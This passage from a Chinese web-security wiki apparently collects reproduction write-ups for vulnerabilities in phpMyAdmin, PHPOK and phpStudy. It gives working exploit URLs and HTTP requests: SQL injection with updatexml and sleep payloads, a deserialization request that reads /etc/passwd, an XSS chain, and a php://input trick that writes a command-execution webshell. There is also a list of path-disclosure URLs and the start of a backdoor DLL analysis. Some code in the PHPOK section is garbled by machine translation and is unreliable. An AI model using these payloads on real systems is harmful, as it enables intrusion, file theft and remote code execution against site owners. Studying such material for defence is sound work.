MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6 `docker run --name myadmin -d --link mysql5.7:db -p 8080:80 phpmyadmin/phpmyadmin:5.0 溯源和构造poc 下载前一个版本 5.0.0的代码压缩包后, 打开libraries/classes/Server/Privileges.php 来到对应行. if (isset($_GET['validate_username'])) { $sql_query = \"SELECT * FROM `mysql`.`user` WHERE `User` = '\" . $_GET['username'] . \"';\"; // 省略 节省篇幅 } 很显然可以看出注入点是$_GET['username'],而需要设置$_GET['validate_username'] 往上看, 这段代码位于public function getExtraDataForAjaxBehavior函数. 搜索上层调用来到/server_privileges.php 的这段代码 if ($response->isAjax() && empty($_REQUEST['ajax_page_request']) && ! isset($_GET['export']) && (! isset($_POST['submit_mult']) || $_POST['submit_mult'] != 'export') && ((! isset($_GET['initial']) || $_GET['initial'] === null || $_GET['initial'] === '') || (isset($_POST['delete']) && $_POST['delete'] === __('Go'))) && ! isset($_GET['showall']) && ! isset($_GET['edit_user_group_dialog']) ) { $extra_data = $serverPrivileges->getExtraDataForAjaxBehavior( (isset($password) ? $password : ''), (isset($sql_query) ? $sql_query : ''), (isset($hostname) ? $hostname : ''), (isset($username) ? $username : '') ); if (! empty($message) && $message instanceof Message) { $response->setRequestStatus($message->isSuccess()); $response->addJSON('message', $message); $response->addJSON($extra_data); exit; } } 可以发现if里大部分条件都可控, 除了$response->isAjax() public function isAjax(): bool { return $this->_isAjax; } 查看构造函数 /** * Creates a new class instance */ private function __construct() { if (! defined('TESTSUITE')) { $buffer = OutputBuffering::getInstance(); $buffer->start(); register_shutdown_function([$this, 'response']); } $this->_header = new Header(); $this->_HTML = ''; $this->_JSON = []; $this->_footer = new Footer(); $this->_isSuccess = true; $this->_isDisabled = false; $this->setAjax(! empty($_REQUEST['ajax_request'])); $this->_CWD = getcwd(); } 可以看到这条件在于$_REQUEST['ajax_request']是否为空. 根据上面的几个条件 我们可以构造出如下最简单的poc http://127.0.0.1:8080/server_privileges.php?ajax_request=true&validate_username=true&username=test%27%22 登陆后(这个操作需要权限) 尝试访问上面的url.返回如下 {\"success\":false,\"error\":\"ErrorStatic analysis:1 errors were found during analysis.Ending quote \\\" was expected. (near \\\"\\\" at position 53)SQL query: Copy\\n Edit \\n\\nSELECT * FROM `mysql`.`user` WHERE `User` = 'test'\"';\\n\\n\\n MySQL said: \\n\\n#1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"'' at line 1\"} 一个sql报错信息, 说明这个最短poc生效了 利用的话 反正都回显了 直接updatexml报错注入 http://127.0.0.1:8080/server_privileges.php?ajax_request=true&validate_username=true&username=test%27%20and%20(select%20updatexml(1,concat(0x7e,(SELECT%20@@version),0x7e),1))%20--%20 在返回最下面可以看到#1105 - XPATH syntax error: '~5.6.46~' 后言 这个洞要求一个可以登录的账号才能注入. , 另外这个请求似乎也不需要csrf-token(不过似乎没什么用) 参考链接 https://xz.aliyun.com/t/7092 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:24 "},"Web安全/Phpmyadmin/（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞/（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞.html":{"url":"Web安全/Phpmyadmin/（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞/（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞.html","title":"（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞","keywords":"","body":"（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞 一、漏洞简介 二、漏洞影响 phpMyAdmin2.x 版本 三、复现过程 POST /scripts/setup.php HTTP/1.1 Host: www.0-sec.org:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 80 action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:24 "},"Web安全/Phpmyadmin/（WooYun-2016-199433）Phpmyadmin scripts_setup.php 反序列化漏洞/（WooYun-2016-199433）Phpmyadmin scripts_setup.php 反序列化漏洞.html":{"url":"Web安全/Phpmyadmin/（WooYun-2016-199433）Phpmyadmin scripts_setup.php 反序列化漏洞/（WooYun-2016-199433）Phpmyadmin scripts_setup.php 反序列化漏洞.html","title":"（WooYun-2016-199433）Phpmyadmin scripts_setup.php 反序列化漏洞","keywords":"","body":"（WooYun-2016-199433）Phpmyadmin scripts/setup.php 反序列化漏洞 一、漏洞简介 phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。 二、漏洞影响 phpmyadmin 2.x 三、复现过程 发送如下数据包，即可读取/etc/passwd： POST /scripts/setup.php HTTP/1.1 Host: www.0-sec.org:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 80 action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";} Phpmyadminscripts_setup.php反序列化漏洞/media/rId24.png) 参考链接 https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:25 "},"Web安全/Phpmyadmin/Phpmyadmin  4.8.3 XSS/Phpmyadmin  4.8.3 XSS.html":{"url":"Web安全/Phpmyadmin/Phpmyadmin  4.8.3 XSS/Phpmyadmin  4.8.3 XSS.html","title":"Phpmyadmin  4.8.3 XSS","keywords":"","body":"Phpmyadmin \\ 一、漏洞简介 最近在审计phpmyadmin的时候发现了一个XSS漏洞，后来发现在版本大于4.8.3以后该漏洞被修复了。看了下之前公布的CVE，有个CVE和此漏洞很相似但没有漏洞细节，于是乎便有了这篇文章。 二、漏洞影响 Phpmyadmin \\ 三、复现过程 在审计phpmyadmin时，我比较关注$GLOBALS全局变量，该变量存储了本次请求的信息、phpmyadmin基本设置信息和phpmyadmin配置文件信息等。先看看/libraries/classes/Server/Privileges.php::3977的以下代码。 foreach ($row as $key => $value) { $GLOBALS[$key] = $value; } 很明显，该处是$GLOBALS的赋值操作，而$row来自于对mysql.user表的查询结果，且$user_host_condition可控，/libraries/classes/Server/Privileges.php::3966行 public static function getDataForChangeOrCopyUser() { $queries = null; $password = null; if (isset($_REQUEST['change_copy'])) { $user_host_condition = ' WHERE `User` = ' . \"'\" . $GLOBALS['dbi']->escapeString($_REQUEST['old_username']) . \"'\" . ' AND `Host` = ' . \"'\" . $GLOBALS['dbi']->escapeString($_REQUEST['old_hostname']) . \"';\"; $row = $GLOBALS['dbi']->fetchSingleRow( 'SELECT * FROM `mysql`.`user` ' . $user_host_condition ); 既然上述代码会将mysql.user中符合条件的行的列名和值写入$GLOBALS中,我们便可通过添加mysql.user的列来往$GLOBALS中写入任意键值。清楚思路后，我们看看哪里调用了Privileges.php的getDataForChangeOrCopyUser函数,发现在server_privileges.php::178中对该函数有调用。 list($queries, $password) = Privileges::getDataForChangeOrCopyUser(); 这时我们来试试向$GLOBALS中写一个$GLOBALS[\\'xz\\']=\\'aliyun\\'。进入mysql库，执行以下2条sql语句向user表添加xz字段，并插入一条数据。 ALTER TABLE user ADD xz varchar(255); INSERT INTO `user` (`Host`, `User`, `Password`, `Select_priv`, `Insert_priv`, `Update_priv`, `Delete_priv`, `Create_priv`, `Drop_priv`, `Reload_priv`, `Shutdown_priv`, `Process_priv`, `File_priv`, `Grant_priv`, `References_priv`, `Index_priv`, `Alter_priv`, `Show_db_priv`, `Super_priv`, `Create_tmp_table_priv`, `Lock_tables_priv`, `Execute_priv`, `Repl_slave_priv`, `Repl_client_priv`, `Create_view_priv`, `Show_view_priv`, `Create_routine_priv`, `Alter_routine_priv`, `Create_user_priv`, `Event_priv`, `Trigger_priv`, `Create_tablespace_priv`, `ssl_type`, `max_questions`, `max_updates`, `max_connections`, `max_user_connections`, `plugin`, `authentication_string`, `xz`) VALUES ('127.0.0.1', 'test', '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '0', '0', '0', '0', '', '', 'aliyun'); 在/libraries/classes/Server/Privileges.php::3980下断点 $serverVersion = $GLOBALS['dbi']->getVersion(); 然后构造http://127.0.0.1/phpMyAdmin-4.8.2/server\\_privileges.php?change\\_copy=aa&old\\_username=test&old\\_hostname=127.0.0.1&mode=5 参数请求，change_copy随便给个参数即可，mode必须大于4否则新添加的数据会被删除。 可以看到$GLOBALS[\\'xz\\']=\\'aliyun\\'已经成功赋值。 利用构造 有了可控的$GLOBALS变量后，我们需要寻找触发点。要在一次请求便触发漏洞，公共页面是首选目标。通过全局搜索$GLOBALS变量，发现在libraries/classes/Navigation/NavigationTree.php::1272的renderDbSelect函数中有使用未过滤的$GLOBALS变量。 $retval .= ''; $retval .= ''; $retval .= Url::getHiddenFields($url_params); $retval .= '' . '' 继续搜索调用renderDbSelect函数地方，发现libraries\\classes\\Navigation\\Navigation.php::62的getDisplay函数。 public function getDisplay() { /* Init */ $retval = ''; $response = Response::getInstance(); if (! $response->isAjax()) { $header = new NavigationHeader(); $retval = $header->getDisplay(); } $tree = new NavigationTree(); if (! $response->isAjax() || ! empty($_REQUEST['full']) || ! empty($_REQUEST['reload']) ) { if ($GLOBALS['cfg']['ShowDatabasesNavigationAsTree']) { // provide database tree in navigation $navRender = $tree->renderState(); } else { // provide legacy pre-4.0 navigation $navRender = $tree->renderDbSelect(); 继续搜索实例化Naviagtion类并且调用了getDisplay函数的地方，发现libraries\\classes\\Header.php::440的getDisplay函数有调用。 public function getDisplay() { $retval = ''; ...(省略) if ($this->_menuEnabled && $GLOBALS['server'] > 0) { $nav = new Navigation(); $retval .= $nav->getDisplay(); } 搜索实例化Header->GetDisplay的方法，发现\\libraries\\classes\\Response.php::100的构造方法中实例化了Header类，而$this-_header又在_getDisplay中被调用。_getDisplay被_htmlResponse调用，_htmlResponse在response函数中被调用。 private function __construct() { if (! defined('TESTSUITE')) { $buffer = OutputBuffering::getInstance(); $buffer->start(); register_shutdown_function(array($this, 'response')); } $this->_header = new Header(); $this->_HTML = ''; $this->_JSON = array(); \\libraries\\classes\\Response.php::266行 private function _getDisplay() { // The header may contain nothing at all, // if its content was already rendered // and, in this case, the header will be // in the content part of the request $retval = $this->_header->getDisplay(); $retval .= $this->_HTML; $retval .= $this->_footer->getDisplay(); return $retval; } \\libraries\\classes\\Response.php::279行 private function _htmlResponse() { echo $this->_getDisplay(); } \\libraries\\classes\\Response.php::438行 public function response() { chdir($this->getCWD()); $buffer = OutputBuffering::getInstance(); if (empty($this->_HTML)) { $this->_HTML = $buffer->getContents(); } if ($this->isAjax()) { $this->_ajaxResponse(); } else { $this->_htmlResponse(); } $buffer->flush(); exit; } 这里注意__construct中的register_shutdown_function函数，看php manual，意思是说当脚本运行结束或遇到exit后会执行该response函数，意思就是说只要哪里实例化了Response类，在程序运行结束后就会执行response函数。真好，回到server_privileges.php::34行，发现有实例化Response。 $response = Response::getInstance(); $header = $response->getHeader(); $scripts = $header->getScripts(); 拥有以上调用链后，只需要控制$GLOBAS的键为text_dir,值为XSS payload即可，进入mysql库，执行以下sql语句修改列名xz为text_dir，并修改数据为XSS Payload。 ALTER TABLE `user` CHANGE `xz` `text_dir` VARCHAR(255) CHARACTER SET utf8 COLLATE utf8_bin NULL DEFAULT NULL; UPDATE `user` SET `text_dir` = '\\\">构造https://wiki.0-sec.org/img src=\\\"https://wiki.0-sec.org/img/69c5e770161c4eaeb6d839977209edf2.png\\\" alt=\\\"3.png\\\" class=\\\"large\\\" onclick=\\\"window.open(this.src)\\\" />成功触发XSS 参考链接 https://xz.aliyun.com/t/7797 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:56 "},"Web安全/Phpmyadmin/Phpmyadmin setup页面配置不当的利用姿势整合/Phpmyadmin setup页面配置不当的利用姿势整合.html":{"url":"Web安全/Phpmyadmin/Phpmyadmin setup页面配置不当的利用姿势整合/Phpmyadmin setup页面配置不当的利用姿势整合.html","title":"Phpmyadmin setup页面配置不当的利用姿势整合","keywords":"","body":"Phpmyadmin setup页面配置不当的利用姿势整合 一、漏洞简介 其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器上的后台数据库(MySQL数据库),但如果采用默认安装,敏感路径未做出处理,便会存在安全漏洞,最突出的是其setup脚本中存在着服务器端请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。 二、漏洞影响 phpMyAdmin 4.0.10.19之前的版本，4.4.15.10之前的4.4.x版本，4.6.6之前的4.6.x版本。 三、复现过程 如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件)我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行 POST http://www.0-sec.org/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 #问号及其后面的内容用于修改修改php的主配置文件php.ini，从而可以执行下面插入的php代码 Host: www.0-sec.org Content-Length: 35 可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果命令如下 POST http://www.0-sec.org/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 Host: www.0-sec.org Content-Length: 102 \" >/var/www/2.php'); #该木马表示将GET方式获取的指令赋值于cmd命令,并使用system()函数运行cmd变量存储的命令 #反斜杠作用:避免服务器将上传内容过滤,输入命令无效 die(); ?> 通过在浏览器访问该木马,便可获取目标系统的shell 参考链接 https://louisnie.github.io/2018/10/23/%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E4%B9%8B%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E6%BC%8F%E6%B4%9E-1/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:58 "},"Web安全/Phpmyadmin/Phpmyadmin 爆路径/Phpmyadmin 爆路径.html":{"url":"Web安全/Phpmyadmin/Phpmyadmin 爆路径/Phpmyadmin 爆路径.html","title":"Phpmyadmin 爆路径","keywords":"","body":"/phpmyadmin/libraries/lect_lang.lib.php /phpMyAdmin/index.php?lang[]=1 /phpMyAdmin/phpinfo.php load_file() /phpmyadmin/themes/darkblue_orange/layout.inc.php /phpmyadmin/libraries/select_lang.lib.php /phpmyadmin/libraries/lect_lang.lib.php /phpmyadmin/libraries/mcrypt.lib.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:00 "},"Web安全/PHPOK/PHPOK 5.3 前台无限制注入/PHPOK 5.3 前台无限制注入.html":{"url":"Web安全/PHPOK/PHPOK 5.3 前台无限制注入/PHPOK 5.3 前台无限制注入.html","title":"PHPOK 5.3 前台无限制注入","keywords":"","body":"PHPOK 5.3 前台无限制注入 一、漏洞简介 二、漏洞影响 PHPOK 5.3 三、复现过程 漏洞分析 注入点：framework/model/list.php#arc_all public function arc_all($project,$condition='',$field='*',$offset=0,$psize=0,$orderby='') { if($this->_total > 100000 && $offset > 10000){ return $this->_arc_all($project,$condition,$field,$offset,$psize,$orderby); } $sql = \" SELECT \".$field.\" FROM \".$this->db->prefix.\"list l \"; $sql .= \" JOIN \".$this->db->prefix.\"list_\".$project['module'].\" ext \"; $sql .= \" ON(l.id=ext.id AND l.site_id=ext.site_id AND l.project_id=ext.project_id) \"; if($project['is_biz']){ $sql .= \" LEFT JOIN \".$this->db->prefix.\"list_biz b ON(b.id=l.id) \"; } if($project['cate'] && $project['cate_multiple']){ $sql.= \" LEFT JOIN \".$this->db->prefix.\"list_cate lc ON(l.id=lc.id) \"; } if($condition){ $sql .= \" WHERE \".$condition.\" \"; } // 拼接$orderby参数 if($orderby){ $sql .= \" ORDER BY \".$orderby.\" \"; } if($psize){ $sql .= \" LIMIT \".intval($offset).\",\".$psize; } //注入 $rslist = $this->db->get_all($sql,'id'); if(!$rslist){ return false; } return $this->_arc_list_format($rslist,$project); } 回溯寻找调用链：framework/phpok_call.php#_arclist private function _arclist($rs,$cache_id='') { // 264行 $orderby = $rs['orderby'] ? $rs['orderby'] : $project['orderby']; // 270行 调用arc_all函数，将$orderby传入 $rslist = $this->model('list')->arc_all($project,$condition,$field,$offset,$psize,$orderby); 回溯：framework/api/project_control.php#load_module private function load_module($rs,$parent_rs='') { // 91行 $keywords = $this->get(\"keywords\"); $ext = $this->get(\"ext\"); $tag = $this->get(\"tag\"); $uid = $this->get('uid','int'); $attr = $this->get('attr'); //价格，支持价格区间 $price = $this->get('price','float'); $sort = $this->get('sort'); //186行 if($sort){ $dt['orderby'] = $sort; // 可控 $pageurl .= '&sort='.rawurlencode($sort); $this->rlist['sort'] = $sort; } // 208行，通过phpok函数动态调用_arclist()函数 $info = $this->call->phpok('_arclist',$dt); 继续回溯，找谁调用了load_module()：framework/api/project_control.php#index_f public function index_f() { //65行 if($project[\"module\"]){ $this->load_module($project,$parent_rs); } } 在控制器里以_f结尾的函数都可以直接被调用 构造poc: http://0-sec.org/api.php?c=project&f=index&token=1234&id=news&sort=(sleep(5)) 漏洞复现 poc GET /api.php?c=project&f=index&token=1234&id=news&sort=(sleep(5)) HTTP/1.1 Host: phpok5_3_147 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3833.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Cookie: PHPSESSION=l87bngd1u307g20iudfmphisu4; XDEBUG_SESSION=PHPSTORM Connection: close 四、参考链接 https://xz.aliyun.com/t/6831 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:26 "},"Web安全/PHPOK/PHPOK 5.3 前台注入/PHPOK 5.3 前台注入.html":{"url":"Web安全/PHPOK/PHPOK 5.3 前台注入/PHPOK 5.3 前台注入.html","title":"PHPOK 5.3 前台注入","keywords":"","body":"PHPOK 5.3 前台注入 一、漏洞简介 二、漏洞影响 PHPOK 5.3 三、复现过程 漏洞分析 灵活获取参数：$this->get()方法 framework / init.php＃get 最后的公共函数get（$ id，$ type =“ safe”，$ ext =“”） { // PGC进入获取 $ val = isset（$ _ POST [$ id]）？$ _POST [$ id]：（isset（$ _ GET [$ id]）？$ _GET [$ id]：（isset（$ _ COOKIE [$ id]）？$ _COOKIE [$ id]：''））; if（$ val ==''）{ if（$ type =='int'|| $ type =='intval'|| $ type =='float'|| $ type =='floatval'）{ 返回0 ; } else { return”; } } //判断内容是否有转义，所有未转义的数据都直接转义 $ addslashes = false; if（function_exists（“ get_magic_quotes_gpc”）&& get_magic_quotes_gpc（））{ $ addslashes = true; } if（！ $ addslashes）{ $ val = $ this-> _ addslashes（$ val）; } 返回$ this-> format（$ val，$ type，$ ext）; } 跟进format函数：framework / init.php＃format 最终的公共函数格式（$ msg，$ type =“ safe”，$ ext =“”） { if（$ msg ==“”）{ return ;; } if（is_array（$ msg））{ foreach（$ msg as $ key => $ value）{ if（！is_numeric（$ key））{ $ key2 = $ this-> format（$ key）; if（$ key2 ==``|| in_array（$ key2，array（'＃'，'＆'，'％'）））{ unset（$ msg [$ key]）; 继续; } } $ msg [$ key] = $ this-> format（$ value，$ type，$ ext）; } if（$ msg && count（$ msg）> 0）{ 返回$ msg; } 返回false; } if（$ type =='html_js'||（$ type =='html'&& $ ext））{ $ msg = stripslashes（$ msg）; if（$ this-> app_id！='admin'）{ $ msg = $ this-> lib（'string'）-> xss_clean（$ msg）; } $ msg = $ this-> lib（'string'）-> clear_url（$ msg，$ this-> url）; 返回addslashes（$ msg）; } //转义去除 $ msg = stripslashes（$ msg）; //格式化处理内容 开关（$ type）{ case'safe_text'： $ msg = strip_tags（$ msg）; $ msg = str_replace（array（“ \\\\”，“'”，'“'，” “），''，$ msg）; break; 情况'system'： $ msg =！preg_match（“ / ^ [a-zA-Z] [a-z0-9A-Z \\ _ \\-] + $ / u”，$ msg）吗？false：$ msg; 打破; 情况'id'： $ msg =！preg_match（“ / ^ [a-zA-Z] [a-z0-9A-Z \\ _ \\-] + $ / u”，$ msg）吗？false：$ msg; 打破; 情况'复选框'： $ msg = strtolower（$ msg）=='on'吗？1：$ this-> format（$ msg，'safe'）; 打破; 情况'int'： $ msg = intval（$ msg）; 打破; 情况'intval'： $ msg = intval（$ msg）; 打破; 情况'float'： $ msg = floatval（$ msg）; 打破; 情况'floatval'： $ msg = floatval（$ msg）; 打破; 案例“时间”： 打破; 情况'html'： $ msg = $ this-> lib（'string'）-> safe_html（$ msg，$ this-> url）; 打破; 情况'func'： $ msg = function_exists（$ ext）？$ ext（$ msg）：假; 打破; 情况'text'： $ msg = strip_tags（$ msg）; 打破; 默认值： $ msg = str_replace（array（“ \\\\”，“'”，'“'，” “），array（”＆＃92;“，”＆＃39;“，”＆quot; “，”＆lt;“，”＆gt;“），$ msg）; break; } if（$ msg）{ $ msg =加上斜线（$ msg）; } 返回$ msg; } 格式默认为安全模式，也就是仅将\\ \\\" \\' \\实体编码。 注入点： framework / api / index_control.php＃phpok_f // ... $ token = $ this-> get（“ token”）; if（！$ token）{ $ this-> json（P_Lang（“接口数据异常”））;; } $ this-> lib（'token'）-> keyid（$ this-> site ['api_code']）; $ info = $ this-> lib（'token'）-> decode（$ token）; if（！$ info）{ $ this-> json（P_Lang（'信息为空'））; } $ id = $ info ['id']; // 176行 $ ext = $ this-> get（'ext'）; if（$ ext && is_array（$ ext））{ foreach（$ ext as $ key => $ value）{ if（！$ value）{ 继续； } // sqlext变量转义取消 if（$ key =='sqlext'&& $ value）{ $ value = str_replace（array（'＆＃39;'，'“”，'’''，'＆＃34 ;'），array（“'”，'“'，”'“，'”'），$ value）; } $ param [$ key] = $ value; } } // $ id从加密的令牌中来 /// sqlsql的值的函数只有_userlist，_arc_condition_single，_arc_condition $ list = $ this-> call-> phpok（$ id，$ param）; 继续跟进phpok函数：framework / phpok_call.php＃phpok 公共功能phpok（$ id，$ rs =“”） { // 76行 $ siteinfo = $ this-> model（'site'）-> get_one（$ rs ['site']）; // 91行 if（substr（$ id，0,1）！='_'）{ // $ id从令牌中来，为phpok表中identifier标识符，$ rs ['site']可控为任意值 $ call_rs = $ this-> load_phpoklist（$ id，$ rs ['site']）; } // 116行 $ func ='_'。$ call_rs ['type_id']; // 131行动态调用函数_xxxx return $ this- > $ func（$ call_rs，$ cache_id）; } 跟进load_phpoklist：framework / phpok_call.php＃load_phpoklist 私有函数load_phpoklist（$ id，$ siteid = 0） { $ this-> model（'call'）-> site_id（$ siteid）; if（$ this-> _ cache && $ this-> _ cache [$ id]）{ 返回$ this-> _ cache [$ id]; } $ this-> _ cache = $ this-> model（'call'）-> all（$ siteid，'identifier'）; if（$ this-> _ cache && $ this-> _ cache [$ id]）{ 返回$ this-> _ cache [$ id]; } 返回false; } 这一段代码$this->model(\\'call\\')->all($siteid,\\'identifier\\');实现的是查询phpok表，其中identifier = xxx的信息，然后在phpok()函数的131行进行动态调用其插入为type_id的值函数。 例如我们要调用framework/phpok_call.php下的_arclist函数，我们可以选择： http://0-sec.org/api.php?c=index&f=phpok&ext[site]=1&token=加密('id=m_picplayer') 我们接着在framework/phpok_call.php电子邮件寻找柯林斯触发SQL的函数，从phpok表里我们可以看到其默认的TYPE_ID只有四个不同的值arclist， ，arc，catelist，project我们而需要找到拼接sqlext变量的函数： 框架/ phpok_call.php＃_arclist 私有函数_arclist（$ rs，$ cache_id =''） { // 254行 $ condition = $ this-> _ arc_condition（$ rs，$ flist，$ project）; //带入注入数据 $ array ['total'] = $ this-> model（'list'）-> arc_count（$ project ['module']，$ condition）; } 跟进：framework / phpok_call.php＃_arc_condition 直接拼接了sqlext private function _arc_condition($rs,$fields='',$project='') { // 623行 if($rs['sqlext']){ $condition .= \" AND \".$rs['sqlext']; } // 671行 return $condition; } 接着将结果带入了： $ this-> model（'list'）-> arc_count（$ project ['module']，$ condition）; 调用：framework / model / list.php＃arc_count 5.jpg 拼接sql，调用$this->db->count($sql) framework / engine / db / mysqli.php＃count 公共功能计数（$ sql =“”，$ is_count = true） { if（$ sql && is_string（$ sql）&& $ is_count）{ $ this-> set（'type'，'num'）; $ rs = $ this-> get_one（$ sql）; $ this-> set（'type'，'assoc'）; 返回$ rs [0]; } else { if（$ sql && is_string（$ sql））{ $ this-> query（$ sql）; } if（$ this-> query）{ 返回mysqli_num_rows（$ this-> query）; } } 返回false; } 根进get_one函数：framework / engine / db / mysqli.php＃get_one 公共功能get_one（$ sql =''） { if（$ sql）{ $ false = $ this-> cache_false（$ sql）; if（$ false）{ 返回false; } if（$ this-> cache_get（$ sql））{ 返回$ this-> cache_get（$ sql）; } $ this-> query（$ sql）; 根进$this->query($sql);：framework / engine / db / mysqli.php＃query 最终将sql带入执行。 当然，到这里，其实还有一个问题没有解决，我们需要如果拿到token=加密(\\'id=m_picplayer\\')。 框架/ API / index_control.php＃token_f { $ this-> config（'is_ajax'，true）; if（！$ this-> site ['api_code']）{ $ this-> error（P_Lang（“系统未配置接口功能”））; } $ id = $ this-> get（'id'，'system'）; if（！$ id）{ $ this-> error（P_Lang（'未指定数据调用标识'））; } $ this-> model（'call'）-> site_id（$ this-> site ['id']）; //限制范围，其中identifier = $ id $ rs = $ this-> model（'call'）-> get_one（$ id，'identifier'）; if（！$ rs ||！$ rs ['status']）{ $ this-> error（P_Lang（'标识不存在或未启用'））; } // 141行 $ array = array（'id'=> $ id，'param'=> $ param）; $ token = $ this-> lib（'token'）-> encode（$ array）; $ this-> success（$ token）; } 其中第一个如果条件需要在后台生成api字符串： 没开启的话，其实构造一个csrf的poc也是可以的 第二个条件预期id=m_picplayer即可 漏洞复现 http://0-sec.org/api.php?c=index&f=token&id=m_picplayer POC： GET /api.php?c=index&f=phpok&token=6318fdtC3WRpOzYNzKVNw78PFa9OhFea5pp3/uZ4U3T67a/F47WhJ0lr856V7yomOcG0u8/UJpIwKKOwJAKspTSWN+5ljVNWR5978g7HHoG14M&ext[sqlext]=sleep(5)%23&ext[site]=1 HTTP/1.1 Host: 0-sec.org Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.86 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Cookie: PHPSESSION=l87bngd1u307g20iudfmphisu4 Connection: close 四、参考链接 https://xz.aliyun.com/t/6830 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:30 "},"Web安全/Phpstudy/Phpstudy nginx 解析漏洞/Phpstudy nginx 解析漏洞.html":{"url":"Web安全/Phpstudy/Phpstudy nginx 解析漏洞/Phpstudy nginx 解析漏洞.html","title":"Phpstudy nginx 解析漏洞","keywords":"","body":"Phpstudy nginx 解析漏洞 一、漏洞简介 phpStudy 存在 nginx 解析漏洞，攻击者能够利用上传功能，将包含恶意代码的合法文件类型上传至服务器，从而造成任意代码执行的影响。 该漏洞仅存在于phpStudy Windows版，Linux版不受影响。 二、漏洞影响 phpstudy: \\ 三、复现过程 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:34 "},"Web安全/Phpstudy/Phpstudy 后门（非官方后门！！！）/Phpstudy 后门（非官方后门！！！）.html":{"url":"Web安全/Phpstudy/Phpstudy 后门（非官方后门！！！）/Phpstudy 后门（非官方后门！！！）.html","title":"Phpstudy 后门（非官方后门！！！）","keywords":"","body":"Phpstudy 后门（非官方后门！！！） 一、漏洞简介 二、漏洞影响 Phpstudy 2016 php\\php-5.2.17\\ext\\php_xmlrpc.dll php\\php-5.4.45\\ext\\php_xmlrpc.dll Phpstudy 2018 的php-5.2.17、php-5.4.45 PHPTutorial\\php\\php-5.2.17\\ext\\php_xmlrpc.dll PHPTutorial\\php\\php-5.4.45\\ext\\php_xmlrpc.dll 三、复现过程 分析过程 1、定位特征字符串位置 2、静态分析传参数据 3、动态调试构造传参内容 php_xmlrpc.dll PHPstudy 2018与2016两个版本的里的PHP5.2与PHP5.4版本里的恶意php_xmlrpc.dll一致。 定位特征字符串位置 根据\\@eval()这个代码执行函数定位到引用位置。\\@是PHP提供的错误信息屏蔽专用符号。Eval()可执行php代码，中间%s格式符为字符串传参。函数地址为：0x100031F0 /media/rId27.jpg) 图1：eval特征代码 静态分析传参数据 通过F5查看代码，分析代码流程，判断条件是有全局变量且有HTTP_ACCEPT_ENCODING的时候进入内部语句。接下来有两个主要判断来做正向连接和反向连接的操作。主要有两个部分。 第一部分，正向连接：判断ACCEPT_ENCODING如果等于gzip,deflate，读取ACCEPT_CHARSE的内容做base64解密，交给zend_eval_strings()函数可以执行任意恶意代码。 